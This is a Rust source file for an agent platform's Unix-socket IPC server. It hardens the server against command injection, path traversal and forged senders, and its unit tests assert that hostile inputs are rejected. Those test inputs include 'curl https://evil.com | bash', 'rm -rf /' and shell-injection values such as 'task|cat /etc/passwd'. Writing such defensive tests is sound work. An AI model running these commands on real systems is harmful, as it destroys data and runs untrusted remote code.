// crates/clawos-agent/src/ipc/mod.rs
//
// IPC Server: Unix domain socket listener.
// Implements the P1.7 IPC protocol (NDJSON over Unix socket).
//
// Security hardening (audit #3):
//   - Socket created with mode 0o600 (owner-only)
//   - `from` field validated against ALLOWED_SENDERS allowlist
//   - SIGKILL only sent to PIDs registered as ClawOS worker processes
//
// Security hardening (audit #4 — patch):
//   FIX C-01: rollback_cmd whitelist — no longer passed to bash -c.
//             Only a fixed set of pre-approved script paths may be executed,
//             via execvp (no shell). Arbitrary command strings are rejected.
//   FIX C-02: task_id sanitization — path traversal via "../" sequences
//             is now blocked before building ClawFS paths.
//   FIX H-03: SO_PEERCRED peer UID check — the `from` string in the JSON
//             envelope is insufficient; we now also verify the connecting
//             process's real UID via the kernel credential record.

use anyhow::Result;
//use crate::agent::{AgentMessage, AgentReply};
use crate::agent::{AgentMessage};
use serde_json::Value;
use std::collections::HashSet;
use std::path::Path;
use std::sync::{Arc, Mutex};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::{UnixListener, UnixStream};
use tracing::{debug, error, info, warn};

/// Senders allowed to send messages to the agent IPC socket.
/// Any `from` field not in this list is rejected with E003.
const ALLOWED_SENDERS: &[&str] = &[
    "clawos-ebpf-userspace",
    "clawos-channel-telegram",
    "clawos-channel-web-gateway",
    "clawos-tools",
    "clawos-agent", // self (gate checks, admin)
];

// ── FIX C-01: rollback command whitelist ─────────────────────────────────────
//
// Rollback commands are NEVER executed via `bash -c <untrusted-string>`.
// The IPC payload carries a *script name* (no arguments, no path separators).
// That name is looked up here; only the exact binary path is executed via
// tokio::process::Command (execvp — no shell involvement).
//
// To add a new rollback: add an entry to this table and commit via dual-agent
// review (RULE-003). The script itself must live in /var/lib/clawos/scripts/.

const ROLLBACK_WHITELIST: &[(&str, &str)] = &[
    (
        "rollback-migration",
        "/var/lib/clawos/scripts/rollback-migration.sh",
    ),
    (
        "rollback-tool-update",
        "/var/lib/clawos/scripts/rollback-tool-update.sh",
    ),
    (
        "rollback-channel",
        "/var/lib/clawos/scripts/rollback-channel.sh",
    ),
];

/// Resolve a rollback name to its absolute script path.
/// Returns Err if the name is not in the whitelist.
fn resolve_rollback(name: &str) -> Result<&'static str> {
    ROLLBACK_WHITELIST
        .iter()
        .find(|(n, _)| *n == name)
        .map(|(_, path)| *path)
        .ok_or_else(|| {
            anyhow::anyhow!(
                "E004: rollback name '{}' is not in the whitelist. \
             Allowed: {}",
                name,
                ROLLBACK_WHITELIST
                    .iter()
                    .map(|(n, _)| *n)
                    .collect::<Vec<_>>()
                    .join(", ")
            )
        })
}

// ── FIX C-02: task_id sanitization ───────────────────────────────────────────
//
// task_id values arrive over IPC and are embedded in filesystem paths.
// Only [a-zA-Z0-9_-] characters (max 128 chars) are accepted.

const TASK_ID_MAX_LEN: usize = 128;

fn sanitize_task_id(id: &str) -> Result<&str> {
    if id.is_empty() || id.len() > TASK_ID_MAX_LEN {
        anyhow::bail!("E005: task_id length invalid (got {})", id.len());
    }
    if !id
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
    {
        anyhow::bail!(
            "E005: task_id '{}' contains illegal characters \
             (only [a-zA-Z0-9_-] allowed)",
            id
        );
    }
    Ok(id)
}

// ── FIX H-03: SO_PEERCRED UID verification ───────────────────────────────────
//
// The `from` field in the JSON envelope is self-reported and trivially forgeable.
// As a second layer we read the kernel's SO_PEERCRED record for the connected
// Unix socket, which gives us the peer's real UID/GID/PID as set by the kernel.
//
// Policy: the peer UID must equal our own effective UID (all ClawOS services run
// under the same dedicated system user `clawos`).  Root (uid=0) connections are
// also rejected to prevent accidental privilege escalation paths.

#[cfg(unix)]
fn verify_peer_uid(stream: &UnixStream) -> Result<u32> {
    use nix::sys::socket::{getsockopt, sockopt::PeerCredentials};
    use std::os::unix::io::AsRawFd;

    let fd = stream.as_raw_fd();
    // SAFETY: fd is valid for the lifetime of this call; getsockopt is read-only.
    let cred = getsockopt(
        &unsafe { std::os::unix::io::BorrowedFd::borrow_raw(fd) },
        PeerCredentials,
    )
    .map_err(|e| anyhow::anyhow!("SO_PEERCRED failed: {e}"))?;

    let peer_uid = cred.uid();
    let own_uid = nix::unistd::getuid().as_raw();

    if peer_uid == 0 {
        anyhow::bail!("E003: connection from root (uid=0) rejected");
    }
    if peer_uid != own_uid {
        anyhow::bail!(
            "E003: peer uid {} does not match agent uid {} — connection refused",
            peer_uid,
            own_uid
        );
    }
    Ok(peer_uid)
}

#[cfg(not(unix))]
fn verify_peer_uid(_stream: &UnixStream) -> Result<u32> {
    Ok(0) // non-Unix: UID check not applicable
}

pub struct Server {
    socket_path: String,
    worker_pids: Arc<Mutex<HashSet<u32>>>,
    pub agent_tx: Option<tokio::sync::mpsc::Sender<AgentMessage>>,
}

impl Server {
    /// Start the IPC listener and return a handle.
    pub async fn start(socket_path: &str) -> Result<Self> {
        // Remove stale socket
        if Path::new(socket_path).exists() {
            std::fs::remove_file(socket_path)?;
        }

        // Ensure parent directory exists
        if let Some(parent) = Path::new(socket_path).parent() {
            std::fs::create_dir_all(parent)?;
        }

        let listener = UnixListener::bind(socket_path)?;
        let worker_pids = Arc::new(Mutex::new(HashSet::<u32>::new()));

        // Restrict socket to owner-only (0o600) so other local users cannot connect.
        // Must be done after bind() — bind() honours umask but we want an explicit 0o600.
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(socket_path, std::fs::Permissions::from_mode(0o600))?;
        }

        info!(socket = socket_path, "Agent IPC server listening (mode 0600)");

        let pids_clone = Arc::clone(&worker_pids);
        let path_clone = socket_path.to_string();
        let conn_sem = Arc::new(tokio::sync::Semaphore::new(32));
        tokio::spawn(async move {
            loop {
                let permit = match conn_sem.clone().acquire_owned().await {
                    Ok(p) => p,
                    Err(_) => break,
                };
                match listener.accept().await {
                    Ok((stream, _)) => {
                        let pids = Arc::clone(&pids_clone);
                        let path_for_conn = path_clone.clone();
                        tokio::spawn(async move {
                            let _permit = permit;
                            handle_connection(stream, path_for_conn, pids).await;
                        });
                    }
                    Err(e) => {
                        drop(permit);
                        error!(error = %e, "IPC accept error");
                        break;
                    }
                }
            }
        });

        Ok(Self {
            socket_path: socket_path.to_string(),
            worker_pids,
            agent_tx: None,
        })
    }

    /// Register a worker PID so it can be killed via security.alert messages.
    pub fn register_worker_pid(&self, pid: u32) {
        self.worker_pids.lock().unwrap().insert(pid);
        debug!(pid, "IPC: worker PID registered");
    }

    /// Deregister a worker PID when it exits cleanly.
    pub fn deregister_worker_pid(&self, pid: u32) {
        self.worker_pids.lock().unwrap().remove(&pid);
        debug!(pid, "IPC: worker PID deregistered");
    }
}

async fn handle_connection(
    stream: UnixStream,
    socket_path: String,
    worker_pids: Arc<Mutex<HashSet<u32>>>,
) {
    // FIX H-03: verify peer UID via SO_PEERCRED before reading any data.
    // Reject connections from unexpected UIDs (including root).
    if let Err(e) = verify_peer_uid(&stream) {
        warn!(error = %e, socket = %socket_path, "IPC connection rejected by peer UID check");
        return;
    }

    let (reader, mut writer) = stream.into_split();
    let mut lines = BufReader::new(reader).lines();

    debug!(socket = %socket_path, "New IPC connection (peer UID verified)");

    while let Ok(Some(line)) = lines.next_line().await {
        match process_message(&line, &worker_pids).await {
            Ok(response) => {
                let resp_str = serde_json::to_string(&response).unwrap_or_default();
                if let Err(e) = writer.write_all(format!("{resp_str}\n").as_bytes()).await {
                    warn!(error = %e, "Failed to write IPC response");
                    break;
                }
            }
            Err(e) => {
                let err_resp = error_envelope(&e.to_string());
                let _ = writer
                    .write_all(
                        format!("{}\n", serde_json::to_string(&err_resp).unwrap_or_default())
                            .as_bytes(),
                    )
                    .await;
            }
        }
    }
}

async fn process_message(raw: &str, worker_pids: &Arc<Mutex<HashSet<u32>>>) -> Result<Value> {
    let msg: Value = serde_json::from_str(raw).map_err(|e| anyhow::anyhow!("Invalid JSON: {e}"))?;

    let msg_type = msg
        .get("type")
        .and_then(|v| v.as_str())
        .unwrap_or("unknown");

    let from = msg
        .get("from")
        .and_then(|v| v.as_str())
        .unwrap_or("unknown");

    debug!(msg_type, from, "IPC message received");

    // Validate envelope fields (P1.7 protocol)
    validate_envelope(&msg)?;

    // Validate sender against allowlist (audit #3)
    validate_sender(from)?;

    // Route by type
    let response_payload = match msg_type {
        "task.status" => handle_task_status(&msg).await?,
        "task.complete" => handle_task_complete(&msg).await?,
        "task.failed" => handle_task_failed(&msg).await?,
        "gate.check" => handle_gate_check(&msg).await?,
        "security.alert" => handle_security_alert(&msg, worker_pids).await?,
        other => {
            warn!(msg_type = other, "Unknown IPC message type");
            serde_json::json!({ "status": "unknown_type", "type": other })
        }
    };

    Ok(make_response(&msg, response_payload))
}

fn validate_envelope(msg: &Value) -> Result<()> {
    for required in &[
        "id",
        "version",
        "type",
        "from",
        "to",
        "timestamp",
        "payload",
    ] {
        if msg.get(required).is_none() {
            anyhow::bail!("Missing required envelope field: {required}");
        }
    }
    let version = msg["version"].as_u64().unwrap_or(0);
    if version != 1 {
        anyhow::bail!("Unsupported IPC protocol version: {version}");
    }
    Ok(())
}

/// Reject messages from unknown senders (E003).
fn validate_sender(from: &str) -> Result<()> {
    if !ALLOWED_SENDERS.iter().any(|&s| s == from) {
        warn!(from, "IPC message from unknown sender — rejected (E003)");
        anyhow::bail!("E003: sender '{from}' is not in the IPC allowlist");
    }
    Ok(())
}

async fn handle_task_status(msg: &Value) -> Result<Value> {
    let payload = &msg["payload"];
    let task_id = payload["task_id"].as_str().unwrap_or("?");
    let status = payload["status"].as_str().unwrap_or("?");
    info!(task_id, status, "Task status update received");
    Ok(serde_json::json!({ "ack": true }))
}

async fn handle_task_complete(msg: &Value) -> Result<Value> {
    let payload = &msg["payload"];
    let raw_id = payload["task_id"].as_str().unwrap_or("");
    // FIX C-02: sanitize task_id before embedding in a filesystem path.
    let task_id = sanitize_task_id(raw_id)?;
    let output = &payload["output"];
    info!(task_id, "Task completed");

    // Persist task result to ClawFS task registry (/tasks/<task_id>/result.json).
    // task_id is now validated to contain only [a-zA-Z0-9_-], so path traversal
    // via "../" sequences is impossible.
    let clawfs_path = format!("/tasks/{task_id}/result.json");
    let record = serde_json::json!({
        "task_id":      task_id,
        "status":       "complete",
        "output":       output,
        "completed_at": chrono::Utc::now().timestamp_millis(),
        "phase":        payload["phase"].as_str().unwrap_or("unknown"),
    });

    match persist_to_clawfs(&clawfs_path, &record.to_string()).await {
        Ok(()) => info!(task_id, path = %clawfs_path, "Task result persisted to ClawFS"),
        Err(e) => {
            warn!(task_id, error = %e, "Failed to persist task result to ClawFS — result may be lost")
        }
    }

    Ok(serde_json::json!({ "ack": true, "task_id": task_id }))
}

async fn handle_task_failed(msg: &Value) -> Result<Value> {
    let payload = &msg["payload"];
    let raw_id = payload["task_id"].as_str().unwrap_or("");
    // FIX C-02: sanitize task_id — blocks path traversal.
    let task_id = sanitize_task_id(raw_id)?;
    let err_msg = payload["error_message"].as_str().unwrap_or("unknown");
    // FIX C-01: rollback_name is a logical identifier, not a shell command.
    //           Looked up in ROLLBACK_WHITELIST; executed via execvp, never bash -c.
    let rollback_name = payload["rollback_name"].as_str();

    error!(task_id, error = err_msg, "Task FAILED");

    // Log failure to ClawFS registry
    let clawfs_path = format!("/tasks/{task_id}/result.json");
    let record = serde_json::json!({
        "task_id":   task_id,
        "status":    "failed",
        "error":     err_msg,
        "failed_at": chrono::Utc::now().timestamp_millis(),
    });
    let _ = persist_to_clawfs(&clawfs_path, &record.to_string()).await;

    // Execute whitelisted rollback script if requested.
    // The script name is resolved to a fixed absolute path — no shell, no arguments.
    let mut rollback_initiated = false;
    if let Some(name) = rollback_name {
        match resolve_rollback(name) {
            Err(e) => {
                // Name not in whitelist — log and refuse; never execute.
                error!(task_id, rollback_name = name, error = %e,
                       "Rollback refused: name not in whitelist");
            }
            Ok(script_path) => {
                warn!(
                    task_id,
                    script = script_path,
                    "Executing whitelisted rollback script"
                );
                // execvp: no shell interpretation, no argument injection.
                match tokio::process::Command::new(script_path)
                    // No .arg() calls — scripts take no arguments.
                    .env_clear()
                    .env("PATH", "/usr/local/bin:/usr/bin:/bin")
                    .output()
                    .await
                {
                    Ok(out) if out.status.success() => {
                        info!(task_id, "Rollback completed successfully");
                        rollback_initiated = true;
                    }
                    Ok(out) => {
                        let stderr = String::from_utf8_lossy(&out.stderr);
                        error!(task_id, stderr = %stderr, "Rollback script exited with error");
                    }
                    Err(e) => {
                        error!(task_id, error = %e, "Failed to spawn rollback script");
                    }
                }
            }
        }
    }

    Ok(serde_json::json!({ "ack": true, "rollback_initiated": rollback_initiated }))
}

/// Write a JSON record to ClawFS via the filesystem path (bridge until direct handle wiring).
async fn persist_to_clawfs(path: &str, json: &str) -> Result<()> {
    // Prepend /var/lib/clawos/workspace to map ClawFS paths to real FS
    let real_path = format!("/var/lib/clawos{path}");
    if let Some(parent) = std::path::Path::new(&real_path).parent() {
        tokio::fs::create_dir_all(parent).await?;
    }
    tokio::fs::write(&real_path, json).await?;
    Ok(())
}

async fn handle_gate_check(msg: &Value) -> Result<Value> {
    let gate_str = msg["payload"]["gate"].as_str().unwrap_or("?");
    info!(gate = gate_str, "Gate check requested via IPC");

    match crate::agent::gate::GateId::from_str(gate_str) {
        Some(gate_id) => {
            let result = crate::agent::gate::run_gate(gate_id).await;
            Ok(serde_json::json!({
                "gate":     result.gate,
                "passed":   result.passed,
                "blockers": result.blockers,
                "checks":   serde_json::to_value(&result.checks).unwrap_or_default(),
            }))
        }
        None => {
            warn!(gate = gate_str, "Unknown gate identifier in IPC gate.check");
            Ok(serde_json::json!({
                "gate":   gate_str,
                "passed": false,
                "reason": format!("Unknown gate. Valid: P1_TO_P2, P2_TO_P3, P3_TO_P4, P4_TO_RELEASE")
            }))
        }
    }
}

async fn handle_security_alert(
    msg: &Value,
    worker_pids: &Arc<Mutex<HashSet<u32>>>,
) -> Result<Value> {
    let payload = &msg["payload"];
    let severity = payload["severity"].as_str().unwrap_or("?");
    let event = payload["event_kind"].as_str().unwrap_or("?");
    let details = payload["details"].as_str().unwrap_or("");

    // Security alerts always logged at ERROR regardless of severity
    error!(
        severity,
        event_kind = event,
        details,
        "⚠️  SECURITY ALERT from eBPF monitor"
    );

    let mut action = "logged";

    // Only kill PIDs that were registered as ClawOS worker processes.
    // This prevents an attacker from sending a crafted security.alert to kill arbitrary PIDs.
    if severity == "critical" {
        let pid = payload["pid"].as_u64().unwrap_or(0) as u32;
        if pid > 0 {
            let is_known_worker = worker_pids.lock().unwrap().contains(&pid);
            if is_known_worker {
                match nix::sys::signal::kill(
                    nix::unistd::Pid::from_raw(pid as i32),
                    nix::sys::signal::Signal::SIGKILL,
                ) {
                    Ok(()) => {
                        warn!(
                            pid,
                            "Sent SIGKILL to worker process due to critical security event"
                        );
                        action = "killed";
                    }
                    Err(e) => {
                        error!(pid, error = %e, "Failed to SIGKILL worker process");
                    }
                }
            } else {
                warn!(
                    pid,
                    "security.alert requested SIGKILL on unregistered PID — refused"
                );
                action = "refused_unknown_pid";
            }
        }
    }

    Ok(serde_json::json!({ "ack": true, "action": action }))
}

fn make_response(request: &Value, payload: Value) -> Value {
    serde_json::json!({
        "id":             uuid::Uuid::new_v4().to_string(),
        "version":        1,
        "type":           "response",
        "from":           "clawos-agent",
        "to":             request.get("from").cloned().unwrap_or(Value::Null),
        "timestamp":      chrono::Utc::now().timestamp_millis(),
        "correlation_id": request.get("id").cloned().unwrap_or(Value::Null),
        "payload":        payload
    })
}

fn error_envelope(err: &str) -> Value {
    serde_json::json!({
        "id":        uuid::Uuid::new_v4().to_string(),
        "version":   1,
        "type":      "error",
        "from":      "clawos-agent",
        "to":        "unknown",
        "timestamp": chrono::Utc::now().timestamp_millis(),
        "payload":   { "error": err, "code": "E001" }
    })
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── C-02: task_id sanitization ──────────────────────────────────────────

    #[test]
    fn task_id_valid_accepted() {
        assert!(sanitize_task_id("task-abc_123").is_ok());
        assert!(sanitize_task_id("T").is_ok());
    }

    #[test]
    fn task_id_path_traversal_blocked() {
        assert!(sanitize_task_id("../../vault/P1.2").is_err());
        assert!(sanitize_task_id("../etc/shadow").is_err());
        assert!(sanitize_task_id("foo/bar").is_err());
    }

    #[test]
    fn task_id_null_byte_blocked() {
        assert!(sanitize_task_id("task\0exec").is_err());
    }

    #[test]
    fn task_id_empty_blocked() {
        assert!(sanitize_task_id("").is_err());
    }

    #[test]
    fn task_id_too_long_blocked() {
        let long = "a".repeat(TASK_ID_MAX_LEN + 1);
        assert!(sanitize_task_id(&long).is_err());
    }

    #[test]
    fn task_id_special_chars_blocked() {
        assert!(sanitize_task_id("task;rm -rf /").is_err());
        assert!(sanitize_task_id("task|cat /etc/passwd").is_err());
        assert!(sanitize_task_id("task$(evil)").is_err());
    }

    // ── C-01: rollback whitelist ────────────────────────────────────────────

    #[test]
    fn rollback_whitelist_allows_known_names() {
        assert!(resolve_rollback("rollback-migration").is_ok());
        assert!(resolve_rollback("rollback-tool-update").is_ok());
        assert!(resolve_rollback("rollback-channel").is_ok());
    }

    #[test]
    fn rollback_arbitrary_command_rejected() {
        assert!(resolve_rollback("rm -rf /").is_err());
        assert!(resolve_rollback("curl https://evil.com | bash").is_err());
        assert!(resolve_rollback("sh").is_err());
        assert!(resolve_rollback("").is_err());
    }

    #[test]
    fn rollback_path_traversal_rejected() {
        assert!(resolve_rollback("../../etc/cron.d/evil").is_err());
        assert!(resolve_rollback("/var/lib/clawos/scripts/rollback-migration.sh").is_err());
    }

    // ── validate_sender ─────────────────────────────────────────────────────

    #[test]
    fn validate_sender_known_accepted() {
        assert!(validate_sender("clawos-tools").is_ok());
        assert!(validate_sender("clawos-ebpf-userspace").is_ok());
    }

    #[test]
    fn validate_sender_unknown_rejected() {
        assert!(validate_sender("attacker").is_err());
        assert!(validate_sender("root").is_err());
        assert!(validate_sender("clawos-tools-extra").is_err()); // no prefix match
    }
}
